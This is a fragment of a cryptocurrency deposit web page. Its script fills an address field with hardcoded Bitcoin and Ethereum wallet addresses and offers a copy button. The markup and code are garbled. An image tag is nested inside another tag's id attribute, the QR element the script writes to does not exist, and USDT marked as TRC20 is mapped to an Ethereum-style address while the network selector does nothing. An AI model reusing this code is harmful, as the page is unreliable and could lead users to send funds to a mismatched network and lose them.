<div class="main">

<div class="header">
<h1>Deposit Crypto</h1>
</div>

<div class="card">
<h3>Select Coin & Network</h3>

<select id="coin">
<option value="Bitcoin">Bitcoin (BTC)</option>
<option value="Ethereum">Ethereum (ETH)</option>
<option value="USDT">USDT (TRC20)</option>
</select>

<select id="network">
<option value="BTC Network">BTC Network</option>
<option value="ERC20">ERC20</option>
<option value="TRC20">TRC20</option>
</select>
</div>

<div class="card deposit-box">

<div class="qr-box">
<img id="<img decoding="sync" loading="lazy" sizes="586px" srcset="https://64.media.tumblr.com/7479b383bbe842ee2d44f3a5aaf67e50/71eebc309c42d214-ee/s100x200/68a50267f32ea35897158f78ca1af7b8786ddfae.jpg 100w, https://64.media.tumblr.com/7479b383bbe842ee2d44f3a5aaf67e50/71eebc309c42d214-ee/s250x400/e6591a0330429f36e552eee1b2cb3e17d5f85689.jpg 250w, https://64.media.tumblr.com/7479b383bbe842ee2d44f3a5aaf67e50/71eebc309c42d214-ee/s400x600/70eb85ee8a10c9bd7f7343f8110d08b7132eb9b3.jpg 400w, https://64.media.tumblr.com/7479b383bbe842ee2d44f3a5aaf67e50/71eebc309c42d214-ee/s500x750/dc7770660659119e8e529feab5034f973b2b6f49.jpg 500w, https://64.media.tumblr.com/7479b383bbe842ee2d44f3a5aaf67e50/71eebc309c42d214-ee/s540x810/9563ac3cf1d3b7b48ae205663270d7c7b188685c.jpg 540w, https://64.media.tumblr.com/7479b383bbe842ee2d44f3a5aaf67e50/71eebc309c42d214-ee/s640x960/8cae97ad30f0043e415a7b7997c219a449ea61d5.jpg 586w"">
<p>Scan QR Code</p>

<div class="address-box">
<h3>Deposit Address</h3>
<input type="text" id="walletAddress" readonly>
<button class="copy-btn" onclick="copyAddress()">Copy Address</button>

<div class="instructions">
• Send only the selected coin to this address.<br>
• Network must match or funds may be lost.<br>
• Minimum deposit: 0.0001 BTC equivalent.
</div>

</div>



<script>

const walletAddresses = {
Bitcoin: "1JopUcUYRvPhWQDiwcTJcG5YwoVWiLAwuD",
Ethereum: "0x448c2747e8c4305e20b2055568135e1a27a810ce",
USDT: "0x448c2747e8c4305e20b2055568135e1a27a810ce"
};

function generateDeposit(){
let coin = document.getElementById("coin").value;
let address = walletAddresses[coin];
document.getElementById("walletAddress").value = address;

QRCode.toDataURL(address).then(url=>{
document.getElementById("qrCode").src = url;
});
}

function copyAddress(){
let input = document.getElementById("walletAddress");
navigator.clipboard.writeText(input.value);
alert("Address copied successfully!");
}

document.getElementById("coin").addEventListener("change",generateDeposit);
generateDeposit();

</script>
